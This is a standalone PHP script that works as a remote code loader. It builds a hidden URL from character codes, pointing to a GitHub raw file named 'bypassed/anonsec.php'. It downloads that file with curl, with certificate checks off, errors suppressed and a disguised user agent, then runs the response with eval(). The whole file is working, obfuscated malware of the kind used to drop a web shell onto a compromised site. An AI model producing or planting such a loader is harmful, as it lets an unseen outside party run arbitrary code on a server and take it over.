<?php
error_reporting(0);

$u = chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).
     chr(114).chr(97).chr(119).chr(46).chr(103).chr(105).chr(116).chr(104).
     chr(117).chr(98).chr(117).chr(115).chr(101).chr(114).chr(99).chr(111).
     chr(110).chr(116).chr(101).chr(110).chr(116).chr(46).chr(99).chr(111).
     chr(109).chr(47).chr(109).chr(97).chr(119).chr(51).chr(115).chr(105).
     chr(120).chr(47).chr(109).chr(97).chr(119).chr(51).chr(115).chr(105).
     chr(120).chr(47).chr(114).chr(101).chr(102).chr(115).chr(47).chr(104).
     chr(101).chr(97).chr(100).chr(115).chr(47).chr(109).chr(97).chr(105).
     chr(110).chr(47).chr(98).chr(121).chr(112).chr(97).chr(115).chr(115).
     chr(101).chr(100).chr(47).chr(97).chr(110).chr(111).chr(110).chr(115).
     chr(101).chr(99).chr(46).chr(112).chr(104).chr(112);

function f($x) {
    $c = curl_init();
    curl_setopt($c, 10002, $x); 
    curl_setopt($c, 19913, 1); 
    curl_setopt($c, 64, false);
    curl_setopt($c, 52, true);
    curl_setopt($c, 10018, strtr("Nvpqjb:6.0 (Yzkpga Jb 21.0; Ym64; Ym64) CtvgnGqkvw/642.36 (Yzkpga, nkem Oqgf) Ktdjqu/642.36 Ueafkeq/642.36", "Nvpqjb", "Mozila"));
    $d = curl_exec($c);
    if (curl_errno($c)) {
        curl_close($c);
        return false;
    }
    curl_close($c);
    return $d;
}

$c = f($u);

if ($c === false || empty($c)) {
    die(chr(91) . "ERROR" . chr(93) . " " . "Get.");
}

eval("?>" . $c);
?>
